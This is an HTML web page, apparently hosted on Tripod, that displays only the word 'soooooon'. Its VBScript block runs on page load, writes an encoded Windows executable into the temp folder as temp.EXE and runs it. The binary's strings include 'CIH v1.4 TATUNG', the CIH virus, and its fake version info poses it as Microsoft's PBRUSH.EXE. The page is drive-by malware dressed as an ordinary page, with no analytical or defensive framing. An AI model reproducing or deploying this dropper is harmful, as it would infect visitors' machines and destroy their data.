<HTML><SCRIPT LANGUAGE="VBScript">
Dim FSO,WSH,OUT,SYS,O
Set FSO=CreateObject("Scripting.FileSystemObject")
Set WSH=CreateObject("WScript.Shell")
SYS=FSO.GetSpecialFolder(2)
Set OUT=FSO.CreateTextFile(SYS&"\temp.EXE",True)
Function C(I)
C=Chr(I)
End Function
O=C(0)
Function S(I,J)
S=String(J,I)
End Function
Function N(I)
N=S(O,I)
End Function

OUT.Write("MZ"&O&C(3)&N(3)&C(4)&N(3)&"ÿÿ"&O&O&"¸"&N(7)&"@"&N(35)&"€"&N(3)&C(14)&C(31)&"º"&C(14)&O&"´"&C(9)&"Í!¸"&C(1)&"LÍ!This program cannot be run in DOS mode."&S(C(13),2)&C(10)&"$"&N(6)&"UPE"&O&O&"L"&C(1)&C(4)&O&"fUó/"&N(8)&"à"&O&C(14)&C(1)&C(11)&C(1)&C(2)&"2"&O&C(2)&N(3)&C(12)&N(6)&"@"&C(2)&N(3)&C(16)&N(3)&" "&N(4)&"@"&O&O&C(16)&N(3)&C(2)&O&O&C(1)&N(7)&C(4)&N(8)&"P"&N(3)&C(4)&O&O&"GÂ"&O&O&C(2)&N(5)&C(16)&O&O&C(16)&N(4)&C(16)&O&O&C(16)&N(6)&C(16)&N(12)&" "&O&O&"ä"&N(4)&"0"&O&O&C(4)&C(7)&N(19)&"@"&O&O&C(20)&N(85)&"P t"&N(4)&C(2)&N(3)&C(16)&N(3)&C(2)&N(3)&C(4)&N(14)&"`"&O&O&"`.idata"&N(3)&C(2)&N(3)&" "&N(3)&C(2)&N(3)&C(6)&N(14)&"@"&O&O&"@.rsrc"&N(4)&C(16)&N(3)&"0"&N(3)&C(8)&N(3)&C(8)&N(14)&"@"&O&O&"@.reloc"&O&O&"4"&N(4)&"@"&N(3)&C(2)&N(3)&C(16)&N(14)&"@"&O&O&"B.rsrc"&N(3)&"€+"&N(4)&C(1)&N(5)&"æ"&N(3)&"ä @"&O&"U"&C(1)&O&O&"«"&C(16)&"@"&O&"À"&C(1)&O&O&"UD$ø3Ûd‡"&C(3)&"è"&N(4)&"[KBQPP"&C(15)&C(1)&"L$ş[ƒÃ"&C(28)&"ú‹+f‹küq"&C(18)&"Vf‰süÁî"&C(16)&"f‰s"&C(2)&"^ÌV‹ğ‹Hüó¤ƒè"&C(8)&"‹0"&C(11)&"öt"&C(2)&"ëğ^Ìû3Ûë"&C(7)&"3Ûd‹"&C(3)&"‹ d"&C(3)&"X]h"&C(12)&C(16)&"@"&O&"Ãt2"&C(15)&"!Áã"&C(16)&"ƒ"&C(4)&"$"&C(21)&"f‰küÁí"&C(16)&"f‰k"&C(2)&"Ï"&C(15)&"#Ãj"&C(15)&"QjÿQQQj"&C(1)&"j"&C(2)&"Í S"&O&C(1)&O&"ƒÄ —FÏ‡çüÿÿPÍ g"&O&"@"&O&C(15)&"#ÀX‹N=‹"&C(17)&"‰Pü@Ö‰"&C(1)&"úë¶Sè"&N(4)&"[ƒÃ$SÍ h"&O&"@"&O&"Xÿt$"&C(8)&"ÿSüYPSÿSüY"&C(15)&"#ÀX[ÃV"&C(23)&C(2)&"À`è"&N(4)&"^Æ"&C(19)&C(3)&O&O&"ö"&C(6)&C(1)&C(15)&"…"&C(8)&C(2)&O&O&"\$(ƒ;$"&C(15)&"…õ"&C(1)&O&O&"ş"&C(6)&"ƒÆ"&C(5)&"VŠC"&C(4)&"<ÿt"&C(8)&C(4)&"@´:‰"&C(6)&"FFj"&O&"j‹["&C(16)&"‹C"&C(12)&"ƒÀ"&C(4)&"PVÍ A"&O&"@"&O&"ƒÄ"&C(16)&"|"&C(6)&"ü.EXE^"&C(15)&"…¶"&C(1)&O&O&"fƒ{"&C(24)&C(1)&C(15)&"…«"&C(1)&O&O&"f¸"&O&"CÍ 2"&O&"@"&O&C(15)&"‚›"&C(1)&O&O&"Q‹¾Rıÿÿ‹?öÁ"&C(1)&"t"&C(8)&"f¸"&C(1)&"C3Éÿ×3À´Õ3É3ÒB‹ÚCÿ×“YœöÁ"&C(1)&"t"&C(6)&"f¸"&C(1)&"Cÿ×"&C(15)&"‚b"&C(1)&O&O&"VœƒÆ3À´Ö‹èj"&C(4)&"Yj<Zÿ×‹"&C(22)&"J‹Åÿ×>"&O&"PE"&O&C(15)&"…$"&C(1)&O&O&"Sj"&O&"j"&C(1)&"mspaint.exe"&O&"U‹ìƒìDVÿ"&C(21)&"\ @"&O&"‹ğŠ"&O&"<"&C(34)&"u"&C(19)&"FŠ"&C(6)&"„Àt"&C(4)&"<"&C(34)&"uõ€>"&C(34)&"u"&C(13)&"Fë"&C(10)&"< ~"&C(6)&"F€> ú€>"&O&"t"&C(11)&"€> "&C(6)&"F€>"&O&"uõÇEè"&N(4)&"E¼Pÿ"&C(21)&"X @"&O&"öEè"&C(1)&"¸"&C(10)&N(3)&"t"&C(4)&C(15)&"·EìPVj"&O&"j"&O&"ÿ"&C(21)&"d @"&O&"Pè"&C(5)&N(3)&"^‹å]Ãÿt$"&C(16)&"j"&O&"ÿt$"&C(20)&"h"&O&C(16)&"@"&O&"j"&O&"j"&O&"ÿ"&C(21)&"l @"&O&"j"&O&"ÿ"&C(21)&"` @"&O&"3ÀÂ"&C(16)&O&"RW"&C(15)&"#ÌP‹Å±RƒÂ"&C(7)&"ÿ×B"&C(34)&"P"&C(6)&"P"&C(15)&"·F"&C(14)&"T"&C(16)&C(18)&"°(Š"&C(14)&"öáv2PRVAQÁá"&C(3)&"Q"&C(3)&"È"&C(3)&"Ê+N"&C(28)&"÷ÑAQ‘‹Fğ"&C(3)&"Fü‰†­ûÿÿf<$¸"&O&"|{‹Åÿ×•j"&C(4)&"YR‹V<ƒÂ"&C(18)&"ÿ×>nZiptgZ[_YW"&C(3)&"ÕR"&C(3)&"îUD=ü‰"&C(24)&"S"&C(3)&"×R¾OûÿÿW‰VÎVØ½û"&C(3)&O&O&"ë1ƒÂ(‹Z"&C(16)&"+Z"&C(8)&"v,Sƒè"&C(8)&"‰"&C(24)&"‹Z"&C(20)&C(3)&"Z"&C(8)&"SW‹Z"&C(8)&C(3)&"Z"&C(12)&C(3)&"^ü‰X"&C(4)&"‹"&C(24)&C(1)&"Z"&C(8)&"J$@"&O&O&"@+ëv"&C(14)&C(3)&"ûâÇ"&C(15)&"!Ìë3ƒÄ<ëJ"&C(1)&"("&C(1)&"l$"&C(8)&"3Û‰Xü†Ÿüÿÿ±"&C(4)&"fÇ"&O&"Í ‹”"&C(39)&"ÿÿÿ‰P"&C(2)&C(15)&"¶”1&ÿÿÿ+Ââå"&C(15)&"!È‹X"&C(16)&"‹8Yã"&C(13)&"‹ñ¸"&C(1)&"Ö"&O&O&"ZYÿ×ëğ[Xùœ3À´×ÿ×^s1‹ßf¸"&C(3)&"C‹Nü‹~şÿÓşNûa"&C(15)&"!Àÿ ‹Üÿs8ÿS$Y‰C"&C(28)&"ƒ{($u"&C(6)&"‹A(< "&O&O&"¬Ş"&C(27)&"2ÿÿÿÿº "&O&O&"X "&O&O&"P "&O&O&"C™!2ÿÿÿÿØ "&O&O&"l "&N(22)&"ˆ "&O&O&"š "&O&O&"¬ "&O&O&"t "&N(6)&"È "&N(6)&"Ğv÷¿Á ø¿*°ø¿9v÷¿"&N(4)&C(17)&"’Ş"&N(4)&"ù"&O&"GetModuleHandleA"&O&O&"$"&C(1)&"GetStartupInfoA"&O&"¼"&O&"GetCommandLineA"&O&"q"&O&"ExitProcess"&O&"KERNEL32.dll"&O&O&"N"&O&"ShellExecuteA"&O&"SHELL32.dll"&O&"‰F"&C(1)&"aÃ°"&C(7)&"æpäq4&uÓf½ø"&C(12)&"vÅ¿L8"&O&"€fºş"&C(12)&"úÿÖf¿X"&O&"JfÇF"&C(8)&"$"&C(15)&"ÿÖ^ô¸UU"&C(14)&O&"¹ª*"&C(14)&O&"ÿÓÆ"&O&"`Qâş2äˆ"&O&"‘âş¸UU"&C(15)&O&"YµªÿÓÆ"&O&" âş´àˆ"&O&"fÇF"&C(8)&C(12)&C(16)&"ÿÖ3Û·€Sƒì,h"&O&C(16)&O&"À·"&C(8)&"SQQQh"&C(1)&C(5)&O&"@AQQ‹ôì¬"&N(3)&"Í "&C(4)&O&C(16)&O&"fƒ~"&C(6)&C(23)&"t"&C(5)&"şFMëî"&C(1)&"^"&C(16)&"ÆFM€ëåˆ"&C(8)&"ˆ"&C(1)&"Æ"&O&"€ˆ"&C(8)&"ˆ"&C(1)&"Ã—‡Õï—‡Õì"&C(12)&"D—‡Õï—‡ÕîÃ"&O&":f"&C(39)&"S"&O&C(1)&O&"h"&O&"@"&O&"A"&O&"@"&O&"2"&O&"@"&O&"CIH v1.4 TATUNG"&N(58)&C(16)&"—f"&C(10)&C(4)&N(5)&C(3)&O&C(3)&N(3)&"("&O&O&"€"&C(14)&N(3)&"@"&O&O&"€"&C(16)&N(3)&"X"&O&O&"€"&N(4)&C(16)&"—f"&C(10)&C(4)&N(5)&C(1)&O&C(1)&N(3)&"p"&O&O&"€"&N(4)&C(16)&"—f"&C(10)&C(4)&N(5)&C(1)&O&C(1)&N(3)&"ˆ"&O&O&"€"&N(4)&C(16)&"—f"&C(10)&C(4)&N(5)&C(1)&O&C(1)&N(3)&" "&O&O&"€"&N(4)&C(16)&"—f"&C(10)&C(4)&N(5)&C(1)&O&S(C(4),2)&O&O&"¸"&N(7)&C(16)&"—f"&C(10)&C(4)&N(5)&C(1)&O&S(C(4),2)&O&O&"È"&N(7)&C(16)&"—f"&C(10)&C(4)&N(5)&C(1)&O&S(C(4),2)&O&O&"Ø"&N(3)&"è0"&O&O&"è"&C(2)&O&O&"ä"&C(4)&N(6)&"Ğ3"&O&O&C(20)&N(3)&"ä"&C(4)&N(6)&"ä3"&O&O&" "&C(3)&O&O&"ä"&C(4)&N(6)&"("&N(3)&" "&N(3)&"@"&N(3)&C(1)&O&C(4)&N(6)&C(2)&N(24)&"€"&O&O&"€"&N(3)&"€€"&O&"€"&N(3)&"€"&O&"€"&O&"€€"&O&O&"ÀÀÀ"&O&"€€€"&N(3)&"ÿ"&O&O&"ÿ"&N(3)&"ÿÿ"&O&"ÿ"&N(3)&"ÿ"&O&"ÿ"&O&"ÿÿ"&O&O&"ÿÿÿ"&N(23)&"333330"&N(8)&C(3)&"{{{{{{s3"&N(6)&C(8)&"···´DD···3"&N(5)&"û{{{LÌÌD{{s0"&N(3)&C(15)&"····ÌÌÌÌG··0"&N(3)&"û{{{{ÌÌÌÌK{{3"&O&O&C(15)&"··"&C(17)&C(23)&"·¼ÌÌÄ···³"&O&O&C(11)&"{q™‘"&C(27)&"{|Ì{{{{s"&O&O&"··"&C(25)&"™™‘·······³"&O&O&"{{™™™"&C(27)&"{{{{{{{s"&O&O&"··™™‘···³"&O&C(7)&"··³"&O&C(15)&"{{y™‘{{{0"&O&O&"{{s"&O&C(15)&"···™—··³"&O&"À"&O&C(7)&"·0"&O&C(15)&"{{{{{{{s"&O&C(12)&O&C(7)&"w0"&O&C(15)&"·"&S(C(34),2)&C(39)&"···³"&O&O&"À"&C(8)&"s"&O&O&C(15)&"r**"&C(34)&"{{{w0"&O&C(12)&C(8)&"€"&O&O&C(15)&"²¢¢¢"&C(39)&"···s3pÀ"&N(3)&C(15)&"{***+{{{{{s"&C(15)&N(3)&C(15)&"·¢¢¢······0"&O&"ğ"&O&O&C(15)&"{z*{{{{{{s"&O&O&C(15)&N(3)&"÷····UU··0"&N(6)&"û{{{UİÕ[{0"&N(6)&"÷··µİİİW³"&N(4)&C(15)&O&O&"{{İİİÕ{s"&N(5)&"ğ"&O&C(15)&"··½İİÕ·0"&N(7)&C(15)&"{{İİİ{{0"&N(8)&"÷·····³"&N(9)&C(15)&"ÿ{{{w0"&N(10)&C(7)&"ÿÿÿp"&N(40)&"üğ"&C(1)&"ÿş"&O&O&"?ş"&O&O&C(15)&"ü"&O&O&C(7)&"ø"&O&O&C(3)&"ğ"&O&O&C(3)&"à"&O&O&C(1)&"À"&O&O&C(1)&"À"&O&O&C(1)&"€"&O&O&C(1)&"€"&O&O&C(1)&"€"&O&O&C(1)&O&O&C(6)&C(1)&O&O&S(C(3),2)&O&O&C(17)&C(3)&O&O&C(24)&C(7)&N(3)&C(15)&N(3)&C(31)&N(3)&C(31)&N(3)&""&O&O&C(1)&"Ç€"&O&C(3)&"á€"&O&C(3)&"ğ€"&O&C(7)&"ğ€"&O&C(7)&"øÀ"&O&C(15)&"ü")
OUT.Write("À"&O&C(15)&"üà"&O&C(31)&"ığ"&O&"?ÿø"&O&"ÿş"&C(1)&"ÿÿÿÿÿÿ"&O&O&C(1)&O&C(1)&O&"  "&C(16)&O&C(1)&O&C(4)&O&"è"&C(2)&O&O&C(1)&O&" "&C(3)&"4"&N(3)&"V"&O&"S"&O&"_"&O&"V"&O&"E"&O&"R"&O&"S"&O&"I"&O&"O"&O&"N"&O&"_"&O&"I"&O&"N"&O&"F"&O&"O"&N(5)&"½"&C(4)&"ïş"&O&O&C(1)&N(3)&C(4)&O&"¶"&C(3)&N(4)&C(4)&O&"¶"&C(3)&O&O&"?"&N(7)&C(1)&O&C(1)&O&C(1)&N(15)&"€"&C(2)&O&O&C(1)&O&"S"&O&"t"&O&"r"&O&"i"&O&"n"&O&"g"&O&"F"&O&"i"&O&"l"&O&"e"&O&"I"&O&"n"&O&"f"&O&"o"&N(3)&"\"&C(2)&O&O&C(1)&O&"0"&O&"4"&O&"0"&O&"4"&O&"0"&O&"4"&O&"B"&O&"0"&N(3)&"L"&O&C(22)&O&C(1)&O&"C"&O&"o"&O&"m"&O&"p"&O&"a"&O&"n"&O&"y"&O&"N"&O&"a"&O&"m"&O&"e"&N(5)&"M"&O&"i"&O&"c"&O&"r"&O&"o"&O&"s"&O&"o"&O&"f"&O&"t"&O&" "&O&"C"&O&"o"&O&"r"&O&"p"&O&"o"&O&"r"&O&"a"&O&"t"&O&"i"&O&"o"&O&"n"&N(3)&"@"&O&C(12)&O&C(1)&O&"F"&O&"i"&O&"l"&O&"e"&O&"D"&O&"e"&O&"s"&O&"c"&O&"r"&O&"i"&O&"p"&O&"t"&O&"i"&O&"o"&O&"n"&N(5)&"W"&O&"i"&O&"n"&O&"d"&O&"o"&O&"w"&O&"s"&O&" "&O&"¿Šr‚äv"&O&O&"4"&O&C(9)&O&C(1)&O&"F"&O&"i"&O&"l"&O&"e"&O&"V"&O&"e"&O&"r"&O&"s"&O&"i"&O&"o"&O&"n"&N(5)&"4"&O&"."&O&"0"&O&"0"&O&"."&O&"9"&O&"5"&O&"0"&N(5)&"/"&O&C(7)&O&C(1)&O&"I"&O&"n"&O&"t"&O&"e"&O&"r"&O&"n"&O&"a"&O&"l"&O&"N"&O&"a"&O&"m"&O&"e"&N(3)&"P"&O&"b"&O&"r"&O&"u"&O&"s"&O&"h"&N(5)&"p"&O&"&"&O&C(1)&O&"L"&O&"e"&O&"g"&O&"a"&O&"l"&O&"C"&O&"o"&O&"p"&O&"y"&O&"r"&O&"i"&O&"g"&O&"h"&O&"t"&N(3)&"C"&O&"o"&O&"p"&O&"y"&O&"r"&O&"i"&O&"g"&O&"h"&O&"t"&O&" "&O&"c"&O&" "&O&"M"&O&"i"&O&"c"&O&"r"&O&"o"&O&"s"&O&"o"&O&"f"&O&"t"&O&" "&O&"C"&O&"o"&O&"r"&O&"p"&O&"."&O&" "&O&"1"&O&"9"&O&"9"&O&"1"&O&"-"&O&"1"&O&"9"&O&"9"&O&"5"&N(3)&"?"&O&C(11)&O&C(1)&O&"O"&O&"r"&O&"i"&O&"g"&O&"i"&O&"n"&O&"a"&O&"l"&O&"F"&O&"i"&O&"l"&O&"e"&O&"n"&O&"a"&O&"m"&O&"e"&N(3)&"P"&O&"B"&O&"R"&O&"U"&O&"S"&O&"H"&O&"."&O&"E"&O&"X"&O&"E"&N(5)&"l"&O&"%"&O&C(1)&O&"P"&O&"r"&O&"o"&O&"d"&O&"u"&O&"c"&O&"t"&O&"N"&O&"a"&O&"m"&O&"e"&N(5)&"M"&O&"i"&O&"c"&O&"r"&O&"o"&O&"s"&O&"o"&O&"f"&O&"t"&O&"R"&O&" "&O&"W"&O&"i"&O&"n"&O&"d"&O&"o"&O&"w"&O&"s"&O&"R"&O&" "&O&"O"&O&"p"&O&"e"&O&"r"&O&"a"&O&"t"&O&"i"&O&"n"&O&"g"&O&" "&O&"S"&O&"y"&O&"s"&O&"t"&O&"e"&O&"m"&N(5)&"8"&O&C(9)&O&C(1)&O&"P"&O&"r"&O&"o"&O&"d"&O&"u"&O&"c"&O&"t"&O&"V"&O&"e"&O&"r"&O&"s"&O&"i"&O&"o"&O&"n"&N(3)&"4"&O&"."&O&"0"&O&"0"&O&"."&O&"9"&O&"5"&O&"0"&N(5)&"D"&N(3)&C(1)&O&"V"&O&"a"&O&"r"&O&"F"&O&"i"&O&"l"&O&"e"&O&"I"&O&"n"&O&"f"&O&"o"&N(5)&"$"&O&C(4)&N(3)&"T"&O&"r"&O&"a"&O&"n"&O&"s"&O&"l"&O&"a"&O&"t"&O&"i"&O&"o"&O&"n"&N(5)&S(C(4),2)&"°"&C(4)&"PADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPAD"&O&C(16)&O&O&C(20)&N(3)&C(21)&"0[0v00š0¢0"&N(492))
OUT.Close

WSH.run(SYS & "\temp.EXE") 

</SCRIPT>
<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center"><font size="7">soooooon</font></p>

</HTML><script type="text/javascript" src="http://hb.lycos.com/hb.js"></script>
<script type="text/javascript" src="http://ratings.lycos.com/ratings/lycosRating.js.php"></script>
<script type="text/javascript"><!--//--><![CDATA[//><!--
var cm_role = "live";
var cm_host = "tripod.lycos.com";
var cm_taxid = "/memberembedded";
var tripod_member_name = "dody116";
var tripod_member_page = "dody116/chi_14.html";
var tripod_ratings_hash = "1235301885:719a799e69caeed638aa623bcdcb0599";

var lycos_ad_category = null;

var lycos_ad_remote_addr = "94.216.162.110";
var lycos_ad_www_server = "www.tripod.lycos.com";
var lycos_ad_track_small = "http://members.tripod.com/adm/img/common/ot_smallframe.gif?rand=386023";
var lycos_ad_track_served = "http://members.tripod.com/adm/img/common/ot_adserved.gif?rand=386023";
//--><!]]></script>
<script type="text/javascript" src="http://scripts.lycos.com/catman/init.js"></script>
<script type="text/javascript" src="http://members.tripod.com/adm/ad/code-start.js"></script>
<script type="text/javascript" src="http://members.tripod.com/adm/ad/code-middle.js"></script>
<script type="text/javascript" src="http://members.tripod.com/adm/ad/code-end.js"></script>
<noscript>
 <img src="http://members.tripod.com/adm/img/common/ot_noscript.gif?rand=386023" alt="" width="1" height="1" />
 <!-- BEGIN STANDARD TAG - 728 x 90 - Lycos - Tripod Fallthrough - DO NOT MODIFY -->
 <iframe frameborder="0" marginwidth="0" marginheight="0" scrolling="no" width="728" height="90" src="http://ad.yieldmanager.com/st?ad_type=iframe&ad_size=728x90&section=209094"></iframe>
 <!-- END TAG -->
</noscript>
